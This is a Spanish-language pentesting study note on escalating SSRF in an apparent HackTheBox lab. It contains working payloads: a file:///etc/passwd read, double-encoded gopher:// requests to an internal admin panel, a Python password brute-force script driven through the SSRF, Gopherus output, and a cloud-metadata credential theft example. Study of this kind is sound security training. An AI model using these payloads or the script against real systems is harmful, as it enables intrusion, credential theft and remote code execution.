---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/SSRF
Descripción: "Confirmada la SSRF y mapeada la red interna, el objetivo es aumentar el impacto: alcanzar endpoints que solo escuchan en local, leer ficheros del servidor y —el salto…"
Fecha de actualización: 2026-06-22
Nota previa: "[[02 - Identificación de SSRF]]"
Nota siguiente: "[[04 - Blind SSRF]]"
Area: "[[SSRF.base|SSRF]]"
---
Confirmada la SSRF y mapeada la red interna, el objetivo es **aumentar el impacto**: <mark style="background: #ADCCFFA6;">alcanzar endpoints que solo escuchan en local, leer ficheros del servidor y —el salto cualitativo— enviar peticiones arbitrarias a servicios internos</mark> con `gopher://`.

> [!example]+ Caso real — ESEA → metadata de AWS · $1.000
> Brett Buerhaus llegó a un endpoint `media_preview.php?url=` (image fetch). Tras fallar los bypasses de null-byte, convirtió el `/1.png` final en query-string (`?url=http://ziot.org?1.png`) y ESEA renderizó **su web** → SSRF confirmada. Ben Sadeghipour sugirió apuntar `url` a `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — como ESEA corría en **AWS**, devolvió las **credenciales IAM** vivas del servidor. **Lección**: confirmada la SSRF, *piensa a lo grande* — el endpoint de metadata cloud bate cualquier truco menor.

# Acceder a endpoints restringidos

Un host o endpoint interno puede ser inaccesible desde fuera pero alcanzable a través de la SSRF. En el ejemplo, `dateserver.htb` devuelve `403 Forbidden` al acceder directamente, pero **sí responde** cuando es el servidor quien lo pide. Desde ahí, enumeramos sus rutas con un *directory brute-force* canalizado por la SSRF —filtrando la página de error por defecto de Apache—:

```shell-session
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
    -u http://172.17.0.2/index.php -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
    -fr "Server at dateserver.htb Port 80"
```

```
[Status: 200] FUZZ: admin
[Status: 200] FUZZ: availability
```

> [!attention]+ Uso de `&date`
> El parámetro `&date=2024-01-01` se incluye porque el código backend de la aplicación web requiere **ambos campos al mismo tiempo** para procesar el formulario correctamente.
> - **Comportamiento de la aplicación:** La función legítima que imita este ejercicio de HTB es consultar la disponibilidad de un sistema en una fecha concreta. Por ello, el formulario original espera recibir tanto el servidor (`dateserver`) como el día deseado (`date`).
> - **Evitar fallos previos a la SSRF:** Si enviaras únicamente el parámetro `dateserver`, <mark style="background: #FFB8EBA6;">la aplicación devolvería un error previo de validación</mark> (por ejemplo, un aviso de "Parámetro 'date' faltante") y detendría la ejecución del código antes de llegar a realizar la petición de red (el _sink_ vulnerable a SSRF).
> - **Replicar el tráfico legítimo:** Para que `ffuf` reciba respuestas válidas que te permitan analizar si un recurso existe o no, <mark style="background: #ADCCFFA6;">debes enviar la solicitud exactamente igual a como la enviaría el navegador web en uso normal</mark>, <mark style="background: #FF5582A6;">cambiando únicamente el valor que deseas fuzzear</mark> (`FUZZ`).

<mark style="background: #FF5582A6;">Aparece `/admin.php`</mark>, un endpoint interno que ahora podemos solicitar vía SSRF (`dateserver=http://dateserver.htb/admin.php`) — potencialmente acceso a información de administración que la red perimetral protegía.

# Leer ficheros locales: `file://`

Si el cliente HTTP soporta el esquema (cURL lo hace), cambiarlo a `file://` convierte la SSRF en **lectura de ficheros locales**:

```
dateserver=file:///etc/passwd
```

<mark style="background: #ADCCFFA6;">Esto degrada la SSRF a una [[01 - Local File Inclusion (LFI)|LFI]] de solo lectura</mark>, útil para leer el **código fuente** de la app (y descubrir más endpoints, credenciales y rutas) o claves SSH. Las técnicas de lectura del módulo File Inclusion aplican igual.

# `gopher://` — de `GET` a peticiones arbitrarias

Cuando solo controlamos la URL de destino y el servidor fija el método internamente, quedamos limitados a `GET`: no podemos enviar un `POST` con cuerpo. <mark style="background: #FFB8EBA6;">No es una limitación del esquema `http://`</mark> (cURL hace `POST` de sobra) sino del **punto de inyección** —solo controlamos la URL, no el método—. Estorba cuando el endpoint interno espera un `POST` —por ejemplo, el login de `/admin.php` que recibe la contraseña en `adminpw`—.

<mark style="background: #8000E1A6;">El esquema `gopher://` envía **bytes arbitrarios** a un socket TCP</mark>, así que construimos la petición HTTP a mano. Partimos del `POST` que queremos enviar:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

Lo serializamos en una URL gopher: prefijo `gopher://host:puerto/_` y el resto **URL-encodeado** (espacios `%20`, saltos de línea `%0D%0A`):

```url
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

> [!warning]+ Doble URL-encoding
> Como esta URL gopher viaja **dentro** del parámetro `dateserver` (que ya es `application/x-www-form-urlencoded`), hay que **codificar la URL entera una segunda vez** para que llegue intacta al cliente HTTP. Si no, obtienes un `Malformed URL`. Es el error más común al construir payloads gopher a mano.
> 
> En la <mark style="background: #ADCCFFA6;">segunda codificación del formulario HTTP</mark>: Convierte cada símbolo de porcentaje `%` en `%25` (y los dos puntos `:` en `%3a`). Esto protege los `%` para que el servidor web no los consuma antes de tiempo.

El resultado: el endpoint interno acepta el `POST` y entramos al panel. La misma técnica habla con **cualquier servicio TCP**, no solo HTTP. Aquí podemos ver <mark style="background: #FFB8EBA6;">cómo queda la solicitud tras las dos codificaciones de la URL</mark>:
```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

## Enviar la solicitud de `gopher://`
<mark style="background: #ADCCFFA6;">Una vez ya tenemos el payload podemos sustituir el valor del parámetro vulnerable</mark> (`dateserver`) en Burp Suite Repeater o mediante `curl` por la cadena codificada dos veces (<mark style="background: #FF5582A6;">importante incluir el parámetro necesario si lo hubiere</mark>, como en este caso `&date`):
```HTTP
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3A%2F%2Fdateserver.htb%3A80%2F_POST%2520%2Fadmin.php%2520HTTP%252F1.1%250D%250AHost%253A%2520dateserver.htb%250D%250AContent-Length%253A%252013%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

Sin embargo, esto solo manda una solicitud (probando con la contraseña `admin`), si quisiéramos lanzar un ataque de fuerza bruta a través de un payload `gopher://`, <mark style="background: #FF5582A6;">no basta con cambiar la palabra por un diccionario simple</mark> en una herramienta como `ffuf`. Hay dos obstáculos técnicos que se deben gestionar: **la longitud del cuerpo (`Content-Length`)** y el **doble URL-encoding**.

Si la contraseña cambia de longitud (por ejemplo, de `admin` de 5 letras a `password123` de 11), la cabecera `Content-Length` del `POST` interno <mark style="background: #ADCCFFA6;">también debe actualizarse en cada intento</mark>. De lo contrario, el servidor interno rechazará la petición o leerá datos incompletos.

El script se encarga de calcular dinámicamente la longitud exacta de cada intento y formatear el payload `gopher://` sobre la marcha.

```Python
import urllib.parse
import requests

url_vulnerable = "http://172.17.0.2/index.php"

# Ruta del WordList que queramos usar
seclist_path = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

# Abrir el archivo ignorando posibles errores de codificación
with open(seclist_path, "r", encoding="utf-8", errors="ignore") as file:
    for line in file:
        password = line.strip()  # Eliminar saltos de línea y espacios
        if not password:
            continue
            
        # 1. Calcular el cuerpo POST y su longitud exacta
        post_body = f"adminpw={password}"
        content_length = len(post_body)
        
        # 2. Construir la petición HTTP interna en bruto
        raw_http = (
            f"POST /admin.php HTTP/1.1\r\n"
            f"Host: dateserver.htb\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            f"{post_body}"
        )
        
        # 3. Primer Encoding (para formar el esquema gopher)
        gopher_payload = "gopher://dateserver.htb:80/_" + urllib.parse.quote(raw_http)
        
        # 4. Segundo Encoding (para viajar en el parámetro de la petición)
        double_encoded_payload = urllib.parse.quote(gopher_payload)
        
        # 5. Enviar la petición al backend
        data = {
            "dateserver": double_encoded_payload,
            "date": "2024-01-01"
        }
        
        response = requests.post(url_vulnerable, data=data)
        
        # 6. Comprobar la respuesta
        if "Acceso concedido" in response.text or response.status_code == 200:
            print(f"\n[+] ¡Contraseña encontrada!: {password}")
            break
```

# `gopher://` contra servicios internos: el alto impacto

Aquí está el verdadero peligro. Con gopher se interactúa con servicios que asumen que solo les habla la red interna y suelen estar **sin autenticar**:

- **Redis** → escribir un cron job o una webshell = **RCE**.
- **FastCGI** (`9000`) → ejecución de PHP = **RCE**.
- **SMTP** (`25`) → enviar correo interno falsificado.
- **MySQL / PostgreSQL** → consultas con el usuario del servicio.

Construir esos payloads a mano es tedioso; la herramienta de referencia es [`Gopherus`](https://github.com/tarunkant/Gopherus), que genera la URL gopher por servicio (`MySQL`, `PostgreSQL`, `FastCGI`, `Redis`, `SMTP`, `Zabbix`, varios `memcache`):

```shell-session
$ python2.7 gopherus.py --exploit smtp
Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
...
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0A...
```

<mark style="background: #FFB86CA6;">El salto de "leer una respuesta interna" a "ejecutar comandos vía Redis/FastCGI" es lo que convierte una SSRF en *critical*</mark>. Gopherus depende de **Python 2** (heredado); el detalle del arsenal y alternativas, en [[07 - Arsenal de herramientas SSRF|arsenal]].

> [!info]+ Fuentes
> - [PortSwigger — Exploiting SSRF](https://portswigger.net/web-security/ssrf) · [Gopherus](https://github.com/tarunkant/Gopherus)
> - [HackTricks — SSRF (gopher, schemes)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) · [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

> [!important]+ SSRF vía API — el bug de más rendimiento en bug bounty
> Las APIs son el hábitat natural del SSRF: parámetros que aceptan URLs — `url`, `callback`, `webhook`, `redirect_uri`, `image_url`, `dest`, `feed` — dejan apuntar el servidor a `169.254.169.254` (metadata cloud) o a hosts internos. <mark style="background: #FFB86CA6;">Ojo al encoding</mark>: si `?id=http://...` devuelve "parámetro inválido", prueba a **Base64-encodear** la URL — muchos backends la esperan en un formato concreto. CVEs recientes del patrón: **CVE-2024-52588** (webhooks de Strapi), **CVE-2024-5526** (Grafana OnCall). Fuente: [YesWeHack — SSRF guide](https://www.yeswehack.com/learn-bug-bounty/server-side-request-forgery-ssrf). El caso web-service equivalente es el [[04 - Ataques a xmlrpc.php|pingback de WordPress]].

Todo lo anterior asume que **vemos la respuesta**. Cuando no es así, entramos en el terreno restringido pero explotable de la [[04 - Blind SSRF]].
